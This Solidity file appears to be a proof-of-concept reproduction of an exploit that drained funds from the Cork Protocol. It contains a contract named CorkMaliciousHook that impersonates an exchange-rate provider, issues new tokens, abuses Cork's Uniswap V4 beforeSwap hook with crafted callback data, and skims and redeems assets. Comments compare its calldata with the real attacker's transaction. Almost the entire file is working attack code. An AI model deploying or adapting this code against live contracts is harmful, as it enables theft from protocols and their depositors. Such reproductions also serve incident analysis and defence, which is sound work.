// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "./Interfaces.sol";
import "./SwapMath.sol";
import "forge-std/console.sol";

// Attacker's Malicious Hook
contract CorkMaliciousHook {
    ICorkHook corkHook;
    IPSMProxy moduleCore;
    IPSMProxy assetFactory;
    IPSMProxy flashSwapProxy;

    IERC20 lpToken;
    IERC20 wstETH;
    IERC20 weETH8CT;
    IERC20 etherfiWETH;
    ICorkConfig corkConfig;
    IUniV4PoolManager uniV4PoolManager;

    address exchangeRateProvider;

    address internal attacker_EOA;

    bytes32 internal constant PAIR_ID_FOR_RATE =
        0x6b1d373ba0974d7e308529a62e41cec8bac6d71a57a1ba1b5c5bf82f6a9ea07a;

    bytes32 internal newPairIdStorage;

    // Callback data passed by the attacker used when UniV4 calls this contract back
    struct MaliciousCallbackData {
        address weETH8DS;
        address wstETH5CT;
        bytes32 pairId;
        address wstETH5DS;
    }

    // Callback data used by Cork's FlashSwap Router when invoking corkCall
    struct CallbackData {
        bool buyDs;
        address caller;
        // CT or RA amount borrowed
        uint256 borrowed;
        // DS or RA amount provided
        uint256 provided;
        bytes32 reserveId;
        uint256 dsId;
    }

    constructor(
        ICorkHook _corkHook,
        IPSMProxy _moduleCore,
        IPSMProxy _assetFactory,
        IERC20 _lpToken,
        IERC20 _wstETH,
        IERC20 _etherfiWETH,
        ICorkConfig _corkConfig,
        IUniV4PoolManager _uniV4PoolManager,
        address _exchangeRateProvider,
        IPSMProxy _flashSwapProxy
    ) {
        corkHook = _corkHook;
        moduleCore = _moduleCore;
        assetFactory = _assetFactory;
        flashSwapProxy = _flashSwapProxy;
        lpToken = _lpToken;
        wstETH = _wstETH;
        etherfiWETH = _etherfiWETH;
        corkConfig = _corkConfig;
        uniV4PoolManager = _uniV4PoolManager;

        exchangeRateProvider = _exchangeRateProvider;

        attacker_EOA = msg.sender;
    }

    function recoverToken(address to, address token) external {
        /*
        The attacker was clever enough to access control this function as it was called some blocks afterwards

        if (msg.sender != storage[0x00] & 0xffffffffffffffffffffffffffffffffffffffff) {
        revert(memory[0x00:0x00]); }

        */
        require(msg.sender == attacker_EOA, "not attacker_EOA");
        IERC20(token).transfer(to, IERC20(token).balanceOf(address(this)));
    }

    function attack() external {
        require(msg.sender == attacker_EOA, "not attacker_EOA");

        // 3.1 Pulls LP and wstETH tokens from EOA
        lpToken.transferFrom(attacker_EOA, address(moduleCore), lpToken.balanceOf(attacker_EOA)); // to proxy
        wstETH.transferFrom(attacker_EOA, address(this), wstETH.balanceOf(attacker_EOA)); // to self

        // 3.2 Makes two calls to getDeployedSwapAssets to identify the Cover Token
        (address[] memory cts, address[] memory ds) = assetFactory.getDeployedSwapAssets(
            address(wstETH),
            address(etherfiWETH),
            493_150_684_700_000_000, // represents the initial Annualized Price (rollback from prev token)
            // wstETH/etherfiWETH swap asset that was deployed with this very specific 90-day-plus-a-second
            // expiry interval
            90 days + 1,
            exchangeRateProvider,
            0,
            7
        );

        //  debug assertion for this reproduction, not strictly needed.
        address _weETH8CT = cts[1];
        require(0xCd25aA56AAD1BCC1BB4b6B6b08BDa53007ec81CE == _weETH8CT, "retrieved ct does not match");

        // 3.3 Retrieves reserves of Cork
        (, uint256 _reserves) = corkHook.getReserves(address(wstETH), _weETH8CT); // weETH8CT

        // 4.4 Performs the swap
        uint256 amtToSwap = _reserves * 9999 / 10_000;
        wstETH.approve(address(corkHook), type(uint256).max);
        IERC20(_weETH8CT).approve(address(corkHook), type(uint256).max);

        corkHook.swap(address(wstETH), _weETH8CT, 0, amtToSwap, "");

        // 4.5 Resets approvals
        wstETH.approve(address(corkHook), 0);
        IERC20(_weETH8CT).approve(address(corkHook), 0);

        // 4.6 Deposits wstETH to Module Core
        wstETH.approve(address(moduleCore), type(uint256).max);
        moduleCore.depositPsm(PAIR_ID_FOR_RATE, 4_000_000_000_000_000);

        // 4.7 Resets approvals
        wstETH.approve(address(moduleCore), 0);

        // Assertion for this test to debug that we are using the same addresses of the traces
        address _weETH8DS = ds[1];
        require(0x7ea0614072e2107C834365BEA14F9b6386fB84A5 == _weETH8DS, "retrieved ds does not match");

        // 4.8 Initializes a new module core, setting self as the ExchangeRateProvider
        // This calls sets CONFIG as this contract, allowing issuing new DS
        // https://github.com/Cork-Technology/Depeg-swap/blob/04068807d3c350955a1e84532b68805b68ca96fb/contracts/core/ModuleState.sol#L65
        corkConfig.initializeModuleCore(address(wstETH), _weETH8DS, 1, 100, address(this));
        bytes32 NEW_PAIR_ID_FOR_RATE = moduleCore.getId(address(wstETH), _weETH8DS, 1, 100, address(this));
        newPairIdStorage = NEW_PAIR_ID_FOR_RATE;

        // 4.9 Issue new tokens (wstETH5DS-3, wstETH5CT-3)
        // timestamp at attack was 1_748_432_387, attacker used 17_484_323_870, almost 10x stamp.
        corkConfig.issueNewDs(NEW_PAIR_ID_FOR_RATE, block.timestamp * 10);

        (address[] memory cts_3, address[] memory ds_3) = assetFactory.getDeployedSwapAssets(
            _weETH8DS,
            address(wstETH),
            1, // TODO: why?
            100,
            address(this), // Impersonating the exchange rate provider
            0,
            1
        );

        // 4.10 Approves and deposits tokens to module core
        IERC20(_weETH8DS).approve(address(moduleCore), type(uint256).max);
        moduleCore.depositLv(
            NEW_PAIR_ID_FOR_RATE,
            IERC20(_weETH8DS).balanceOf(address(this)) / 2,
            0,
            0,
            0,
            block.timestamp * 10
        );

        // 4.11 Call unlock() at Uniswap passing calldata to be executed at this callback
        /*
        Attacker's calldata:
        0000000000000000000000007ea0614072e2107c834365bea14f9b6386fb84a5
        00000000000000000000000051f70fe94e7ccd9f2efe45a4f2ea3a7ae0c62f8c
        c67cae5b35ca2fdf6564b38dc5332c88ad608d1c5b3595dd9ad781f5a340cb9d
        0000000000000000000000001d2724ca345e1889cecddefa5f8f83666a442c86
        */
        MaliciousCallbackData memory maliciousCallbackData = MaliciousCallbackData({
            weETH8DS: _weETH8DS,
            wstETH5CT: cts_3[0],
            pairId: NEW_PAIR_ID_FOR_RATE,
            wstETH5DS: ds_3[0]
        });

        /* 
        Our calldata only differs  in the NEW_PAIR_ID since the MaliciousCorkHook's address is not the same
        0000000000000000000000007ea0614072e2107c834365bea14f9b6386fb84a5
        00000000000000000000000051f70fe94e7ccd9f2efe45a4f2ea3a7ae0c62f8c
        5291badb2bc3a5fd46b91571f3858f63301883f319ae9deb908b0e4f350e6fa8
        0000000000000000000000001d2724ca345e1889cecddefa5f8f83666a442c86
        
        However, this is pretty weird as all those addreses could be stored and retrieved directly from the
        attacker's hook context (this contract)

        */
        uniV4PoolManager.unlock(abi.encode(maliciousCallbackData));

        // 4.17 Ends the redemption process
        uint256 balanceOfETH8CT2 = IERC20(_weETH8CT).balanceOf(address(this));
        IERC20(_weETH8DS).balanceOf(address(this));

        IERC20(_weETH8CT).approve(address(moduleCore), type(uint256).max);
        IERC20(_weETH8DS).approve(address(moduleCore), type(uint256).max);

        moduleCore.returnRaWithCtDs(PAIR_ID_FOR_RATE, balanceOfETH8CT2);

        // 4.18 Reset approvals
        wstETH.approve(address(moduleCore), 0);
        wstETH.approve(address(corkHook), 0);
        wstETH.approve(address(flashSwapProxy), 0);

        console.log(wstETH.balanceOf(address(this)));
    }

    // Callback from when issuing new DS
    function rate() external pure returns (uint256) {
        return 0;
    }

    function rate(bytes32) external pure returns (uint256) {
        return 1;
    }

    function unlockCallback(bytes calldata data) external returns (bytes memory) {
        require(msg.sender == address(uniV4PoolManager), "not pool");
        MaliciousCallbackData memory decodedData = abi.decode(data, (MaliciousCallbackData));

        // 4.12 Retrieves necessary information to craft the beforeSwap call
        (uint256 res8DS2, uint256 res5CT3) = corkHook.getReserves(decodedData.weETH8DS, decodedData.wstETH5CT);

        uint256 amountToSkim = IERC20(decodedData.weETH8DS).balanceOf(address(flashSwapProxy));

        ICorkHook.MarketSnapshot memory marketSnapshot =
            corkHook.getMarketSnapshot(decodedData.weETH8DS, decodedData.wstETH5CT);

        uniV4PoolManager.sync(decodedData.wstETH5CT);

        IUniV4PoolManager.PoolKey memory poolKey = IUniV4PoolManager.PoolKey({
            currency0: decodedData.wstETH5CT,
            currency1: decodedData.weETH8DS,
            fee: 0,
            tickSpacing: 1,
            hooks: address(this)
        });

        IUniV4PoolManager.SwapParams memory swapParams = IUniV4PoolManager.SwapParams({
            zeroForOne: true,
            amountSpecified: int256(res5CT3 / 10),
            sqrtPriceLimitX96: 79_228_162_514_264_337_593_543_950_336 // UniV4 SQRT_PRICE_1_1
        });

        /* 
            Attacker's calldata:
        0000000000000000000000000000000000000000000000000000000000000001
        0000000000000000000000009af3dce0813fd7428c47f57a39da2f6dd7c9bb09
        0000000000000000000000000000000000000000000000000000000000000000
        0000000000000000000000000000000000000000000000cbe5eef0b2d6b0fb66 --> 3761257491693078379366
        c67cae5b35ca2fdf6564b38dc5332c88ad608d1c5b3595dd9ad781f5a340cb9d
        0000000000000000000000000000000000000000000000000000000000000001
        */
        CallbackData memory flashSwapCallbackData = CallbackData({
            buyDs: true,
            caller: address(this),
            borrowed: 0,
            provided: amountToSkim,
            reserveId: newPairIdStorage,
            dsId: 1
        });
        bytes memory hookData = abi.encode(flashSwapCallbackData);

        /*
            Our Calldata 
        0000000000000000000000000000000000000000000000000000000000000001
        000000000000000000000000f62849f9a0b5bf2913b396098f7c7019b51a820a
        0000000000000000000000000000000000000000000000000000000000000000
        0000000000000000000000000000000000000000000000cbe5eef0b603cf5261 --> 3761257491706720244321
        5291badb2bc3a5fd46b91571f3858f63301883f319ae9deb908b0e4f350e6fa8
        0000000000000000000000000000000000000000000000000000000000000001
        */
        corkHook.beforeSwap(address(flashSwapProxy), poolKey, swapParams, hookData);

        // 4.13 Settle tokens
        /*
         We use the oneMinusT from the marketSnapshot to calculate the amountIn used on the 
         uniV4.take() call inside the beforeSwap() path. This amount is what the attacker then 
         skimmed again from the pair.


        (uint256 reserveIn, uint256 reserveOut) =
            zeroForOne ? (self.reserve0, self.reserve1) : (self.reserve1, self.reserve0);

        (Currency input, Currency output) = _getInputOutput(self, zeroForOne);

        reserveIn = normalize(input, reserveIn);
        reserveOut = normalize(output, reserveOut);

        if (reserveIn <= 0 || reserveOut <= 0) {
            revert IErrors.NotEnoughLiquidity();
        }

        uint256 oneMinusT = _1MinT(self);
        (amountIn, fee) = SwapMath.getAmountIn(amountOut, reserveIn, reserveOut, oneMinusT, self.fee);

         */

        (uint256 amountInCalc,) = SwapMath.getAmountIn(
            (res5CT3 / 10), res8DS2, res5CT3, marketSnapshot.oneMinusT, marketSnapshot.baseFee
        );

        // Seems like they were testing, there no need to approve when making a direct tansfer
        IERC20(decodedData.wstETH5CT).approve(address(uniV4PoolManager), 123);
        IERC20(decodedData.wstETH5CT).transfer(address(uniV4PoolManager), amountInCalc);

        uniV4PoolManager.settleFor(address(corkHook));

        // 4.14 Make a subsequent call to cork's beforeSwap but this time without callback data.
        swapParams = IUniV4PoolManager.SwapParams({
            zeroForOne: false, // different direction
            amountSpecified: int256(amountInCalc), // amountIn returned by take()
            sqrtPriceLimitX96: 79_228_162_514_264_337_593_543_950_336 // UniV4 SQRT_PRICE_1_1
        });

        corkHook.beforeSwap(address(flashSwapProxy), poolKey, swapParams, ""); // same poolKey as before

        // 4.15 Call returnRaWithCtDs to start the redemption (cashout) process
        IERC20(decodedData.wstETH5DS).approve(address(moduleCore), type(uint256).max);
        IERC20(decodedData.wstETH5CT).approve(address(moduleCore), type(uint256).max);

        moduleCore.returnRaWithCtDs(newPairIdStorage, IERC20(decodedData.wstETH5CT).balanceOf(address(this)));

        // 4.16 Sync the pool reserves to settle ETH8-DS2
        uniV4PoolManager.sync(decodedData.weETH8DS);
        IERC20(decodedData.weETH8DS).transfer(address(uniV4PoolManager), 1); // TODO: might have something to
            // do with previous 1
        uniV4PoolManager.settleFor(address(corkHook));

        return ""; // to comply with the interface
    }
}
